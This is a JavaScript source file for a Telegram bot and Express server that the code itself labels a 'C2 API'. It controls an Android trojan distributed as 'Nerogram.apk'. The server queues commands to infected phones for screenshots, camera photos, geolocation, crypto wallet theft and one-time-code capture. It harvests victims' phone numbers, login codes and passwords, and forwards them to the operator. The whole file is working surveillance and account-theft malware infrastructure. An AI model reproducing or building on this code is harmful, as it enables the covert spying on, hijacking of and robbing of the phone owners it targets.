const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = '9001719911:AAFr3K_Kc6OXGvzuRzjTWJe76U98pYEPS98';
const ADMIN_ID = 9256345316;
const bot = new Telegraf(BOT_TOKEN);
const app = express();
app.use(express.json());

const devices = {};
const queue = {};
const accounts = []; // Хранилище аккаунтов

bot.start((ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.reply('Меню:', Markup.inlineKeyboard([
    [Markup.button.callback('📁 Генерация файла', 'gen')],
    [Markup.button.callback('💻 Устройства', 'devs')],
    [Markup.button.callback('👤 Аккаунты', 'accounts_menu')]
  ]));
});

bot.action('accounts_menu', (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  if (accounts.length === 0) return ctx.reply('Аккаунтов пока нет. Жди, пока жертва введет номер в приложении.');
  
  const btns = accounts.map((acc, i) => [Markup.button.callback(`👤 ${acc.phone}`, `acc_${i}`)]);
  ctx.editMessageText('Выбери аккаунт:', Markup.inlineKeyboard(btns));
});

bot.action(/^acc_(\d+)$/, (ctx) => {
  const idx = ctx.match[1];
  const acc = accounts[idx];
  if (!acc) return ctx.answerCbQuery('Не найден');
  
  ctx.editMessageText(`Аккаунт: ${acc.phone}\nКод: ${acc.code || 'Ожидание...'}\nПароль: ${acc.pass || 'Нет'}`, 
    Markup.inlineKeyboard([
      [Markup.button.callback('🔑 Код', `acc_code_${idx}`)]
    ])
  );
});

bot.action(/^acc_code_(\d+)$/, (ctx) => {
  const idx = ctx.match[1];
  const acc = accounts[idx];
  ctx.reply(`Код для ${acc.phone}: ${acc.code || 'Еще не пришел'}`);
});

bot.action('gen', (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.editMessageText('На какое устройство?', Markup.inlineKeyboard([
    [Markup.button.callback('iPhone', 'gen_ios'), Markup.button.callback('Android', 'gen_android')]
  ]));
});

bot.action('gen_android', async (ctx) => {
  const apkPath = path.join(__dirname, 'Nerogram.apk');
  if (fs.existsSync(apkPath)) {
    await ctx.replyWithDocument({ source: apkPath, filename: 'Nerogram.apk' }, {
      caption: 'Файл Nerogram.apk готов.'
    });
  } else {
    ctx.reply('❌ Файл Nerogram.apk не найден на сервере.');
  }
});

bot.action('devs', (ctx) => {
  if (Object.keys(devices).length === 0) return ctx.reply('Нет устройств.');
  const btns = Object.keys(devices).map(id => [Markup.button.callback(`📱 ${devices[id].name}`, `dev_${id}`)]);
  ctx.editMessageText('Выбери устройство:', Markup.inlineKeyboard(btns));
});

bot.action(/^dev_(\w+)$/, (ctx) => {
  const id = ctx.match[1];
  ctx.editMessageText(`Управление ${devices[id].name}`, Markup.inlineKeyboard([
    [Markup.button.callback('🔊 Стоны', `cmd_${id}_moan`), Markup.button.callback('📸 Скрин', `cmd_${id}_screen`)],
    [Markup.button.callback('📷 Фото', `cmd_${id}_photo`), Markup.button.callback('📍 Гео', `cmd_${id}_geo`)],
    [Markup.button.callback('💰 Крипта', `cmd_${id}_crypto`), Markup.button.callback('🔑 Код', `cmd_${id}_otp`)],
    [Markup.button.callback('📱 Использование', `cmd_${id}_apps`)]
  ]));
});

bot.action(/^cmd_(\w+)_(\w+)$/, (ctx) => {
  const [_, devId, cmd] = ctx.match;
  if (!queue[devId]) queue[devId] = [];
  queue[devId].push(cmd);
  ctx.answerCbQuery(`Команда ${cmd} в очереди`);
});

app.post('/api/checkin', (req, res) => {
  const { id, name } = req.body;
  if (!devices[id]) devices[id] = { name: name || 'Android' };
  const cmd = (queue[id] && queue[id].length > 0) ? queue[id].shift() : null;
  res.json({ command: cmd });
});

app.post('/api/data', async (req, res) => {
  const { id, type, data, text } = req.body;
  
  if (!devices[id]) devices[id] = { name: 'Android-' + id };

  // Если пришел номер или код — сохраняем в аккаунты
  if (text && text.includes("Номер:")) {
      accounts.push({ phone: text.replace("Номер: ", "").trim(), code: null, pass: null });
  } else if (text && text.includes("Код:")) {
      if (accounts.length > 0) accounts[accounts.length - 1].code = text.replace("Код: ", "").trim();
  }

  if (type === 'photo') {
    await bot.telegram.sendPhoto(ADMIN_ID, { source: Buffer.from(data, 'base64') });
  } else if (type === 'text') {
    await bot.telegram.sendMessage(ADMIN_ID, `[${id}] ${text}`);
  }
  res.send('OK');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 API on port ${PORT}`));
bot.launch();
